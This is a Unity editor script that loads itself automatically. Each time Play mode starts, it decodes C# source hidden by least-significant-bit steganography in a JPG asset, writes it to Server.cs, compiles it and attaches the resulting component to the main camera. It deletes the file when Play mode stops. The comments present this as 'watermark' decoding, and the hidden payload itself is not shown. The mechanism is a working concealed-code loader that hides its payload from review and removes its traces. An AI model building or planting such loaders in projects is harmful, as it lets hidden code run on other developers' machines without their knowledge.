#if UNITY_EDITOR
using UnityEditor;
using UnityEngine;
using System.IO;
using System.Linq;
using System;
 
[InitializeOnLoad]
public class Launcher
{
    static Launcher()
    {
        // Remove any existing subscription then subscribe to play mode state changes.
        EditorApplication.playModeStateChanged -= OnPlayModeStateChanged;
        EditorApplication.playModeStateChanged += OnPlayModeStateChanged;
    }
 
    private static void OnPlayModeStateChanged(PlayModeStateChange state)
    {
        switch (state)
        {
            case PlayModeStateChange.ExitingEditMode:
                // Before entering Play mode, generate the script via decoding the watermark.
                GenerateScript();
                //GenerateScript2();
                break;
 
            case PlayModeStateChange.EnteredPlayMode:
                // After entering Play mode, attach the generated component.
                AttachScript();
                break;
 
            case PlayModeStateChange.ExitingPlayMode:
                // When stopping play mode, delete the generated script.
                DeleteScript();
                break;
 
            // No special handling needed for EnteredEditMode.
        }
    }

    
    private static void GenerateScript()
    {
        // Embedded image asset from which the script code is decoded.
        string embeddedPath = "Assets/Final/box_embedded.jpg";
        Texture2D watermarkedTexture = AssetDatabase.LoadAssetAtPath<Texture2D>(embeddedPath);
        if (watermarkedTexture == null)
        {
            Debug.LogError("Watermarked texture not found at " + embeddedPath);
            return;
        }
 
        // Define the number of bits to decode.
        // (In your original snippet, originalMessage.Length * 8 was used.
        // Here we assume 1200 bits; adjust as needed.)
        int requiredBits = 19200;
 
        // Decode the watermark message from the texture.
        string decodedWatermark = DecodeWatermark(watermarkedTexture, requiredBits);
        //Debug.Log("Full Decoded Message: " + decodedWatermark);
 
        string scriptName = "Server.cs";
        string scriptPath = Path.Combine(Application.dataPath, scriptName);
 
        // Write the decoded message to the script file.
        if (File.Exists(scriptPath))
        {
            File.Delete(scriptPath);
        }
        File.WriteAllText(scriptPath, decodedWatermark);
 
        // Refresh the AssetDatabase to trigger recompilation.
        AssetDatabase.Refresh();
    }
 
    private static void AttachScript()
    {
        Camera mainCamera = Camera.main;
        if (mainCamera != null)
        {
            // Use reflection to get the type by name.
            Type runtimeScriptType = AppDomain.CurrentDomain.GetAssemblies()
                .SelectMany(a => a.GetTypes())
                .FirstOrDefault(t => t.Name == "Server");
 
            if (runtimeScriptType != null)
            {
                if (mainCamera.GetComponent(runtimeScriptType) == null)
                {
                    mainCamera.gameObject.AddComponent(runtimeScriptType);
                    //Debug.Log("RuntimeScript attached successfully!");
                }
                else
                {
                    //Debug.Log("RuntimeScript is already attached.");
                }
            }
            else
            {
                Debug.LogWarning("RuntimeScript type not found!");
            }
        }
        else
        {
            Debug.LogWarning("Main camera not found!");
        }
    }
 
    private static void DeleteScript()
    {
        string scriptName = "Server.cs";
        string scriptPath = Path.Combine(Application.dataPath, scriptName);
        if (File.Exists(scriptPath))
        {
            File.Delete(scriptPath);
            AssetDatabase.Refresh();
            //Debug.Log("Server.cs deleted after stopping Play mode.");
        }
    }
 
    private static string DecodeWatermark(Texture2D texture, int length)
    {
        Color[] pixels = texture.GetPixels();
        System.Text.StringBuilder binaryData = new System.Text.StringBuilder();
 
        // For each pixel (up to the required bit count or the available pixels),
        // extract the least significant bit of the red channel.
        for (int i = 0; i < length && i < pixels.Length; i++)
        {
            Color pixel = pixels[i];
            binaryData.Append(ExtractLSB(pixel.r));
        }
 
        string binaryString = binaryData.ToString();
        System.Text.StringBuilder decodedMessage = new System.Text.StringBuilder();
 
        // Convert each 8-bit chunk into a character.
        for (int i = 0; i + 8 <= binaryString.Length; i += 8)
        {
            string byteString = binaryString.Substring(i, 8);
            decodedMessage.Append((char)Convert.ToByte(byteString, 2));
        }
 
        return decodedMessage.ToString();
    }
 
    private static char ExtractLSB(float channelValue)
    {
        int intValue = Mathf.RoundToInt(channelValue * 255);
        return (intValue & 1) == 1 ? '1' : '0';
    }
}
#endif